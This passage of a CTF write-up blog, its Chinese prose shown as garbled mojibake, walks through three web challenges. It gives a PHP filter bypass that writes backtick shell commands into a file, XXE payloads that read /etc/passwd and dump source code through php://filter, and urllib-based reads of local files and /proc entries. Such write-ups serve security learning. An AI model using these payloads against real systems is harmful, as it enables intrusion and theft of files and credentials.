class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check</span>(<span class="hljs-params"><span class="hljs-variable">$input</span></span>)</span>&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/&#x27;| |_|php|;|~|\\^|\\+|eval|&#123;|&#125;/i&quot;</span>,<span class="hljs-variable">$input</span>))&#123;<br>        <span class="hljs-comment">// if(preg_match(&quot;/&#x27;| |_|=|php/&quot;,$input))&#123;</span><br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;hacker!!!&#x27;</span>);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$input</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">waf</span>(<span class="hljs-params"><span class="hljs-variable">$input</span></span>)</span>&#123;<br>  <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$input</span>))&#123;<br>      <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$input</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span>=&gt;<span class="hljs-variable">$output</span>)&#123;<br>        <span class="hljs-comment">//éå†æ•°ç»„</span><br>          <span class="hljs-variable">$input</span>[<span class="hljs-variable">$key</span>] = <span class="hljs-title function_ invoke__">waf</span>(<span class="hljs-variable">$output</span>);<br>      &#125;<br>  &#125;<span class="hljs-keyword">else</span>&#123;<br>      <span class="hljs-variable">$input</span> = <span class="hljs-title function_ invoke__">check</span>(<span class="hljs-variable">$input</span>);<br>  &#125;<br>&#125;<br><br><span class="hljs-variable">$dir</span> = <span class="hljs-string">&#x27;sandbox/&#x27;</span> . <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>]) . <span class="hljs-string">&#x27;/&#x27;</span>;<br><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$dir</span>))&#123;<br>    <span class="hljs-title function_ invoke__">mkdir</span>(<span class="hljs-variable">$dir</span>);<br>&#125;<br><span class="hljs-keyword">switch</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;action&quot;</span>] ?? <span class="hljs-string">&quot;&quot;</span>) &#123;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;pwd&#x27;</span>:<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$dir</span>;<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;upload&#x27;</span>:<br>        <span class="hljs-variable">$data</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;data&quot;</span>] ?? <span class="hljs-string">&quot;&quot;</span>;<br>        <span class="hljs-title function_ invoke__">waf</span>(<span class="hljs-variable">$data</span>);<br>        <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-string">&quot;<span class="hljs-subst">$dir</span>&quot;</span> . <span class="hljs-string">&quot;index.php&quot;</span>, <span class="hljs-variable">$data</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>å…ˆäº†è§£ä¸‹??çš„ä½œç”¨</p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs ruby">switch(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;action&quot;</span>] <span class="hljs-string">??</span> <span class="hljs-string">&quot;&quot;</span>)<br><br><span class="hljs-string">??</span> åˆ¤æ–­ä¸€ä¸ªå˜é‡æ˜¯å¦å­˜åœ¨ï¼Œå­˜åœ¨åˆ™å¤åˆ¶å˜é‡æœ¬èº«ï¼Œä¸å­˜åœ¨èµ‹å€¼å¦ä¸€å˜é‡<br><span class="hljs-string">??</span> ç›¸å½“äºï¼šisset(<span class="hljs-variable">$a</span>)<span class="hljs-string">?$</span><span class="hljs-symbol">a:</span><span class="hljs-variable">$b</span>;<br>æ˜¯php7 æ¨å‡ºæ¥çš„<br>å¯ä»¥ç®€å•ç†è§£ä¸º ç”¨äºç®€ä¾¿ä¸‰å…ƒè¡¨è¾¾å¼<br><br><span class="hljs-variable">$a</span> = <span class="hljs-number">50</span>;<br><span class="hljs-variable">$a</span> = <span class="hljs-variable">$a</span> <span class="hljs-string">??</span> <span class="hljs-number">1</span>;<br>var_dump(<span class="hljs-variable">$a</span>);<span class="hljs-regexp">//</span><span class="hljs-number">50</span><br></code></pre></td></tr></table></figure>


<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$dir</span> = <span class="hljs-string">&#x27;sandbox/&#x27;</span> . md5(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>]) . <span class="hljs-string">&#x27;/&#x27;</span>;<br><span class="hljs-keyword">if</span>(!file_exists(<span class="hljs-variable">$dir</span>))&#123;<br>    <span class="hljs-built_in">mkdir</span>(<span class="hljs-variable">$dir</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
<p>å¦‚æœdirä¸å­˜åœ¨ï¼Œåˆ›å»ºä¸€ä¸ªdiræ–‡ä»¶<br>å†æ•´ç†ä¸‹æ€è·¯<br>å…ˆè®©actionç­‰äºpwdï¼Œå…ˆå¾—å‡ºæˆ‘ä»¬çš„æ–‡ä»¶è·¯å¾„<br>ç„¶åå†è®©actionç­‰äºuploadï¼Œå…ˆçœ‹ä¸‹é¢æœ‰ä¸€ä¸ªfile_put_contents()å‡½æ•°</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">file_put_contents</span><span class="hljs-params">()</span></span><br><br>file å¿…éœ€ã€‚è§„å®šè¦å†™å…¥æ•°æ®çš„æ–‡ä»¶ã€‚å¦‚æœæ–‡ä»¶ä¸å­˜åœ¨ï¼Œåˆ™åˆ›å»ºä¸€ä¸ªæ–°æ–‡ä»¶ã€‚<br>data å¿…éœ€ã€‚è§„å®šè¦å†™å…¥æ–‡ä»¶çš„æ•°æ®ã€‚å¯ä»¥æ˜¯å­—ç¬¦ä¸²ã€æ•°ç»„æˆ–æ•°æ®æµã€‚<br>mode å¯é€‰ã€‚è§„å®šå¦‚ä½•æ‰“å¼€/å†™å…¥æ–‡ä»¶ã€‚<br></code></pre></td></tr></table></figure>
<p>æˆ‘ä»¬è¦åœ¨index.phpä¸‹å†™å…¥æ•°æ®<br>è¿™é¢˜ç”±äºå†™å…¥çš„æ–‡ä»¶æ˜¯åç¼€åä¸ºphpçš„ï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬çš„è¯­æ³•å°±å¾—æ»¡è¶³phpï¼Œå¹¶ä¸”è¾¾åˆ°å‘½ä»¤æ‰§è¡Œçš„ç‚¹ã€‚<br>ä½†æ˜¯è¿™é¢˜æŠŠphpç»™banäº†ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_32320151/article/details/53607616">phpçš„çŸ­æ ‡ç­¾</a><br>è¦ç¡®ä¿phpé…ç½®ä¸ºshort_open_tag &#x3D; On æ‰èƒ½ä½¿ç”¨</p>
<figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-php"><span class="hljs-meta">&lt;?=</span><span class="hljs-meta">?&gt;</span></span><span class="language-xml"> //ç›¸å½“äº</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">echo</span>;<span class="hljs-meta">?&gt;</span></span><span class="language-xml"></span><br><span class="language-xml"></span><span class="language-php"><span class="hljs-meta">&lt;?=</span><span class="hljs-string">&#x27;1&#x27;</span><span class="hljs-meta">?&gt;</span></span><span class="language-xml">//ç›¸å½“äº</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;1&#x27;</span>;<span class="hljs-meta">?&gt;</span></span><br></code></pre></td></tr></table></figure>
<p>ç©ºæ ¼ä¹Ÿè¢«è¿‡æ»¤äº†ï¼Œè¿™é‡Œä½¿ç”¨%09ç»•è¿‡<br>phpæ”¯æŒä¸€ä¸ªæ‰§è¡Œè¿ç®—ç¬¦â€“åå¼•å·ã€‚PHP å°†å°è¯•å°†åå¼•å·ä¸­çš„å†…å®¹ä½œä¸º shell å‘½ä»¤æ¥æ‰§è¡Œï¼Œå¹¶å°†å…¶è¾“å‡ºä¿¡æ¯è¿”å›ï¼ˆå³ï¼Œå¯ä»¥èµ‹ç»™ä¸€ä¸ªå˜é‡è€Œä¸æ˜¯ç®€å•åœ°ä¸¢å¼ƒåˆ°æ ‡å‡†è¾“å‡ºï¼‰ã€‚ä½¿ç”¨åå¼•å·è¿ç®—ç¬¦çš„æ•ˆæœä¸å‡½æ•°shell_exec() ç›¸åŒã€‚<br>è¿™é¢˜ç”¨systemä¸å¤ªè¡Œï¼Œä¸çŸ¥é“æ˜¯ä»€ä¹ˆåŸå› ï¼Œchatç»™å‡ºçš„è§£é‡Šæ˜¯<br>echo <code>ls</code> æ‰§è¡Œ ls å‘½ä»¤ï¼Œç„¶åå°† ls å‘½ä»¤çš„è¾“å‡ºä½œä¸ºå­—ç¬¦ä¸²ç›´æ¥è¾“å‡ºåˆ°é¡µé¢ã€‚</p>
<p>echo system(â€˜lsâ€™) æ‰§è¡Œ ls å‘½ä»¤ï¼Œå¹¶å°† ls å‘½ä»¤çš„æ‰§è¡Œç»“æœçš„é€€å‡ºçŠ¶æ€ï¼ˆé€šå¸¸æ˜¯ 0 è¡¨ç¤ºæˆåŠŸï¼‰è¾“å‡ºåˆ°é¡µé¢ã€‚<br>ä½†æ˜¯æˆ‘echo system(ls)æ˜¯æˆåŠŸå›æ˜¾index.phpçš„ï¼Œåˆ°echo system(ls &#x2F;)ä¼šæŠ¥é”™</p>
<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">Parse</span> <span class="hljs-literal">error</span>: syntax <span class="hljs-literal">error</span>, unexpected <span class="hljs-string">&#x27;)&#x27;</span> <br></code></pre></td></tr></table></figure>

<p>payload</p>
<figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs mel">?action=upload&amp;data=&lt;?=%09<span class="hljs-string">`ls`</span>?&gt;<br><span class="hljs-comment">//index.php</span><br><br>?action=upload&amp;data=&lt;?=%09<span class="hljs-string">`ls%09/`</span>?&gt;<br><span class="hljs-comment">//bin boot dev etc flllllll1112222222lag home lib lib64 media mnt opt proc root run sbin srv start.sh sys tmp usr var</span><br><br>?action=upload&amp;data=&lt;?=%09<span class="hljs-string">`cat%09/flllllll1112222222lag`</span>?&gt;<br><span class="hljs-comment">//flag&#123;74410ae5-1628-4222-bfc6-b959ac2b56ec&#125;</span><br></code></pre></td></tr></table></figure>

<p>æ‰¾åˆ°äº†systemä¸ºä»€ä¹ˆæŠ¥é”™çš„åŸå› ï¼Œå¾ˆç®€å•çš„é”™è¯¯ğŸ˜­<br>echo system(ls)æ—¶æ­£å¸¸æ‰§è¡Œè€Œecho system(ls &#x2F;)æŠ¥é”™æ˜¯å› ä¸º ls &#x2F; ä¸­çš„ç©ºæ ¼è¢«è§£é‡Šä¸ºå‘½ä»¤å‚æ•°çš„åˆ†éš”ç¬¦ï¼Œåœ¨ PHP ä¸­ï¼Œåº”è¯¥ä½¿ç”¨å­—ç¬¦ä¸²æ¥è¡¨ç¤ºæ•´ä¸ªå‘½ä»¤ï¼Œè€Œä¸”æœ€å¥½ä½¿ç”¨å•å¼•å·æˆ–åŒå¼•å·åŒ…è£¹æ•´ä¸ªå‘½ä»¤ï¼Œä»¥é¿å…ç©ºæ ¼å¯¼è‡´çš„é—®é¢˜ã€‚<br>å› ä¸ºæœ¬é¢˜banäº†å•å¼•å·ï¼Œæˆ‘ä»¬ç”¨åŒå¼•å·æ‹¬èµ·æ¥å°±å¯ä»¥æ­£å¸¸æ‰§è¡Œå‘½ä»¤äº†ã€‚ã€‚</p>
<h2 id="NCTF2019-True-XML-cookbook"><a href="#NCTF2019-True-XML-cookbook" class="headerlink" title="[NCTF2019]True XML cookbook"></a>[NCTF2019]True XML cookbook</h2><p>xxeæ¼æ´<br>æºç ä¸­æœ‰ä¸€æ®µjsä»£ç ï¼Œé™¤äº†çŸ¥é“ä»–æ˜¯xmlæ ¼å¼å†æ— å¤ªå¤§è”ç³»<br>éšä¾¿è¾“å…¥æ•°æ®æŠ“ä¸ªåŒ…<br><img src="/images/8DLDKYTC58PVTNE1.png" srcset="/img/loading.gif" lazyload><br>æŠ“åˆ°xmlæ•°æ®<br>å¼€å§‹æ¼æ´æ³¨å…¥<br>XXEæ¼æ´å‘ç”Ÿåœ¨åº”ç”¨ç¨‹åºè§£æXMLè¾“å…¥æ—¶ï¼Œæ²¡æœ‰ç¦æ­¢å¤–éƒ¨å®ä½“çš„åŠ è½½ï¼Œå¯¼è‡´å¯åŠ è½½æ¶æ„å¤–éƒ¨æ–‡ä»¶å’Œä»£ç ï¼Œé€ æˆä»»æ„æ–‡ä»¶è¯»å–ã€å‘½ä»¤æ‰§è¡Œã€å†…ç½‘ç«¯å£æ‰«æã€æ”»å‡»å†…ç½‘ç½‘ç«™ã€å‘èµ·Dosæ”»å‡»ç­‰å±å®³<br>payload</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE a [</span><br><span class="hljs-meta"> <span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">admin</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span><br><span class="hljs-meta"> ]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span><span class="hljs-symbol">&amp;admin;</span><span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span>1<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span><br></code></pre></td></tr></table></figure>

<p><img src="/images/SDD5GEORQT1HCX3W1R.png" srcset="/img/loading.gif" lazyload></p>
<p>ä¹Ÿå¯ä»¥phpä¼ªåè®®çœ‹çœ‹doLogin.phpçš„æºç </p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE a [</span><br><span class="hljs-meta"> <span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">admin</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;php://filter/convert.base64-encode/resource=/var/www/html/doLogin.php&quot;</span>&gt;</span></span><br><span class="hljs-meta"> ]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span><span class="hljs-symbol">&amp;admin;</span><span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span>1<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span><br><br></code></pre></td></tr></table></figure>
<p><img src="/images/Z1R1SYAUHCU16EWYOB8.png" srcset="/img/loading.gif" lazyload></p>
<p>doLogin.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">/**</span><br><span class="hljs-comment">* autor: c0ny1</span><br><span class="hljs-comment">* date: 2018-2-7</span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-variable">$USERNAME</span> = <span class="hljs-string">&#x27;admin&#x27;</span>; <br><span class="hljs-variable">$PASSWORD</span> = <span class="hljs-string">&#x27;024b87931a03f738fff6693ce0a78c88&#x27;</span>; <br><span class="hljs-variable">$result</span> = <span class="hljs-literal">null</span>;<br><br><span class="hljs-title function_ invoke__">libxml_disable_entity_loader</span>(<span class="hljs-literal">false</span>);<br><span class="hljs-variable">$xmlfile</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;php://input&#x27;</span>);<br><br><span class="hljs-keyword">try</span>&#123;<br>	<span class="hljs-variable">$dom</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DOMDocument</span>();<br>	<span class="hljs-variable">$dom</span>-&gt;<span class="hljs-title function_ invoke__">loadXML</span>(<span class="hljs-variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);<br>	<span class="hljs-variable">$creds</span> = <span class="hljs-title function_ invoke__">simplexml_import_dom</span>(<span class="hljs-variable">$dom</span>);<br><br>	<span class="hljs-variable">$username</span> = <span class="hljs-variable">$creds</span>-&gt;username;<br>	<span class="hljs-variable">$password</span> = <span class="hljs-variable">$creds</span>-&gt;password;<br><br>	<span class="hljs-keyword">if</span>(<span class="hljs-variable">$username</span> == <span class="hljs-variable">$USERNAME</span> &amp;&amp; <span class="hljs-variable">$password</span> == <span class="hljs-variable">$PASSWORD</span>)&#123;<br>		<span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">sprintf</span>(<span class="hljs-string">&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;</span>,<span class="hljs-number">1</span>,<span class="hljs-variable">$username</span>);<br>	&#125;<span class="hljs-keyword">else</span>&#123;<br>		<span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">sprintf</span>(<span class="hljs-string">&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;</span>,<span class="hljs-number">0</span>,<span class="hljs-variable">$username</span>);<br>	&#125;	<br>&#125;<span class="hljs-keyword">catch</span>(<span class="hljs-built_in">Exception</span> <span class="hljs-variable">$e</span>)&#123;<br>	<span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">sprintf</span>(<span class="hljs-string">&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;</span>,<span class="hljs-number">3</span>,<span class="hljs-variable">$e</span>-&gt;<span class="hljs-title function_ invoke__">getMessage</span>());<br>&#125;<br><br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Content-Type: text/html; charset=utf-8&#x27;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$result</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
<p>è´¦å·å¯†ç å¯ä»¥ç™»å½•ï¼Œä½†æ²¡ä»€ä¹ˆç”¨</p>
<p>çœ‹äº†çœ‹åˆ«äººçš„åšå®¢ï¼Œè¦è¯»å–ä¸€ä¸ª&#x2F;proc&#x2F;net&#x2F;arpæ–‡ä»¶<br>è®¿é—®&#x2F;proc&#x2F;net&#x2F;arpæ–‡ä»¶æ—¶æŸ¥çœ‹æœ‰æ— å¯åˆ©ç”¨å†…ç½‘ä¸»æœºç­‰ï¼Œç„¶åé€šè¿‡çˆ†ç ´ä¸»æœºåœ°å€è¿›è¡Œè®¿é—®<br><img src="/images/KJVGJPMMZ7DAP5V3TRE.png" srcset="/img/loading.gif" lazyload><br>è¿™é‡Œè¯´æ˜¯ç”¨xxeå†…ç½‘æ¢æµ‹å­˜æ´»çš„ä¸»æœº<br>ä¸¤ä¸ªipéƒ½è¯»å–äº†<br>ä½†æ˜¯éƒ½æ˜¾ç¤º504ï¼Œæ­£å¸¸åº”è¯¥æŠ¥é”™ç„¶åå†çˆ†ç ´æœ€åä¸€ä½<br>æ‰¾äº†åŠå¤©ï¼Œè¯´æ˜¯ç”±äºbuuctfè½¬ç”¨äº†K8Sç®¡ç†ï¼Œä»–çš„é¶æœºå®¹å™¨æ˜¯éšæœºåœ¨80ï¼Œ81ä¸¤ä¸ªç½‘æ®µé‡Œçš„ï¼Œå…·ä½“æƒ…å†µçœ‹&#x2F;proc&#x2F;net&#x2F;fib_trie<br><img src="/images/XLQNKPD1EG3ZV5NX.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="/images/K9961IT2FQXBLF85HB.png" srcset="/img/loading.gif" lazyload><br>è¿™å›å€’æ˜¯æŠ¥é”™äº†<br><img src="/images/MM97UEZXKZEXPBQ.png" srcset="/img/loading.gif" lazyload><br>çˆ†ç ´æœ€åä¸€ä½ï¼Œè¿™é‡Œæˆ‘ä¹Ÿä¸çŸ¥é“ä¸ºä»€ä¹ˆè¦çˆ†ç ´æœ€åä¸€ä½<br><img src="/images/T8Y63VNM4WWU7XW40M.png" srcset="/img/loading.gif" lazyload><br>ç­‰å¾…<br><img src="/images/8675JE0N4QOX8HO.png" srcset="/img/loading.gif" lazyload></p>
<h2 id="ç½‘é¼æ¯-2020-ç™½è™ç»„-PicDown"><a href="#ç½‘é¼æ¯-2020-ç™½è™ç»„-PicDown" class="headerlink" title="[ç½‘é¼æ¯ 2020 ç™½è™ç»„]PicDown"></a>[ç½‘é¼æ¯ 2020 ç™½è™ç»„]PicDown</h2><p>python2çš„urllibçš„urlopenï¼Œå’Œurllib2ä¸­çš„urlopenæ˜æ˜¾åŒºåˆ«å°±æ˜¯urllib.urlopenæ”¯æŒå°†è·¯å¾„ä½œä¸ºå‚æ•°å»æ‰“å¼€å¯¹åº”çš„æœ¬åœ°è·¯å¾„ï¼Œæ‰€ä»¥å¯ä»¥ç›´æ¥å¡«å…¥è·¯å¾„è¯»å–æ–‡ä»¶<br>python2</p>
<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs abnf">import urllib<br><span class="hljs-attribute">url</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;/etc/passwd&quot;</span><br><span class="hljs-attribute">res</span> <span class="hljs-operator">=</span> urllib.urlopen(url)<br>print(res.read())<br></code></pre></td></tr></table></figure>
<p><img src="/images/LGJFHZSEISV131IO.png" srcset="/img/loading.gif" lazyload></p>
<p>python3</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stylus">import urllib<span class="hljs-selector-class">.request</span><br>url=<span class="hljs-string">&quot;file:///etc/passwd&quot;</span><br>res = urllib<span class="hljs-selector-class">.request</span><span class="hljs-selector-class">.urlopen</span>(url)<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(res.read()</span></span>)<br></code></pre></td></tr></table></figure>
<p><img src="/images/DC82SK28CMD651W3WF.png" srcset="/img/loading.gif" lazyload></p>
<p>åªæœ‰ä¸€ä¸ªè¾“å…¥æ¡†ï¼Œéšä¾¿æäº¤ä¸€ä¸ªæ•°æ®åä¼šè·³è½¬åˆ°pageé¡µé¢ï¼Œå‚æ•°åä¸ºurlï¼Œé€šè¿‡è¾“å…¥ç½‘å€å¯ä»¥ä»¥beautiful.jpgè¿”å›ç½‘å€çš„æºç <br>ä¸ºäº†æ–¹ä¾¿ï¼Œè¿™é‡Œç”¨burp<br><img src="/images/IY3M6OYPCUSTF32JMN70UE.png" srcset="/img/loading.gif" lazyload><br>å¤šæ¬¡å°è¯•è¯»å–æ–‡ä»¶çš„æ–¹æ³•ï¼Œæœ€åå‘ç°ç›´æ¥è¾“å…¥è·¯å¾„å³å¯ï¼ˆè¿™é‡Œå°è¯äº†å¯èƒ½æ˜¯python2çš„urllibçš„urlopenï¼‰<br><img src="/images/K5W2JRHH7XFCWD3QE.png" srcset="/img/loading.gif" lazyload><br>éé¢„æœŸè§£æ˜¯åœ¨è¿™é‡Œç›´æ¥è¯»&#x2F;flagï¼Œå¯ä»¥ç›´æ¥è¯»å‡ºæ¥<br><img src="/images/PR1RDD2P6XYNJO.png" srcset="/img/loading.gif" lazyload></p>
<ul>
<li>procç›®å½•</li>
</ul>
<p>procæ–‡ä»¶ç³»ç»Ÿæ˜¯ä¸€ä¸ªä¼ªæ–‡ä»¶ç³»ç»Ÿï¼Œå®ƒåªå­˜åœ¨å†…å­˜å½“ä¸­ï¼Œè€Œä¸å ç”¨å¤–å­˜ç©ºé—´ã€‚å®ƒä»¥æ–‡ä»¶ç³»ç»Ÿçš„æ–¹å¼ä¸ºè®¿é—®ç³»ç»Ÿå†…æ ¸æ•°æ®çš„æ“ä½œæä¾›æ¥å£ã€‚<br>è¿˜æœ‰çš„æ˜¯ä¸€äº›ä»¥æ•°å­—å‘½åçš„ç›®å½•ï¼Œä»–ä»¬æ˜¯è¿›ç¨‹ç›®å½•ã€‚ç³»ç»Ÿä¸­å½“å‰è¿è¡Œçš„æ¯ä¸€ä¸ªè¿›ç¨‹éƒ½æœ‰å¯¹åº”çš„ä¸€ä¸ªç›®å½•åœ¨&#x2F;procä¸‹ï¼Œä»¥è¿›ç¨‹çš„PIDå·ä¸ºç›®å½•åï¼Œä»–ä»¬æ˜¯è¯»å–è¿›ç¨‹ä¿¡æ¯çš„æ¥å£ã€‚è€Œselfç›®å½•åˆ™æ˜¯è¯»å–è¿›ç¨‹æœ¬èº«çš„ä¿¡æ¯æ¥å£ï¼Œæ˜¯ä¸€ä¸ªlink</p>
<p>åœ¨&#x2F;procæ–‡ä»¶ç³»ç»Ÿä¸­ï¼Œæ¯ä¸€ä¸ªè¿›ç¨‹éƒ½æœ‰ä¸€ä¸ªç›¸åº”çš„æ–‡ä»¶ã€‚ä¸‹é¢æ˜¯&#x2F;procç›®å½•ä¸‹çš„ä¸€äº›é‡è¦æ–‡ä»¶ï¼Œpidæ˜¯è¿›ç¨‹çš„æ ‡å·ï¼š</p>
<ul>
<li>&#x2F;proc&#x2F;pid&#x2F;cmdline æ˜¯ä¸€ä¸ªåªè¯»æ–‡ä»¶ï¼ŒåŒ…å«è¿›ç¨‹çš„å®Œæ•´å‘½ä»¤è¡Œä¿¡æ¯</li>
<li>&#x2F;proc&#x2F;pid&#x2F;cwd åŒ…å«äº†å½“å‰è¿›ç¨‹å·¥ä½œç›®å½•çš„ä¸€ä¸ªé“¾æ¥</li>
<li>&#x2F;proc&#x2F;pid&#x2F;environ åŒ…å«äº†å¯ç”¨è¿›ç¨‹ç¯å¢ƒå˜é‡çš„åˆ—è¡¨</li>
<li>&#x2F;proc&#x2F;pid&#x2F;exe åŒ…å«äº†æ­£åœ¨è¿›ç¨‹ä¸­è¿è¡Œçš„ç¨‹åºé“¾æ¥</li>
<li>&#x2F;proc&#x2F;pid&#x2F;fd&#x2F; è¿™ä¸ªç›®å½•åŒ…å«äº†è¿›ç¨‹æ‰“å¼€çš„æ¯ä¸€ä¸ªæ–‡ä»¶çš„é“¾æ¥</li>
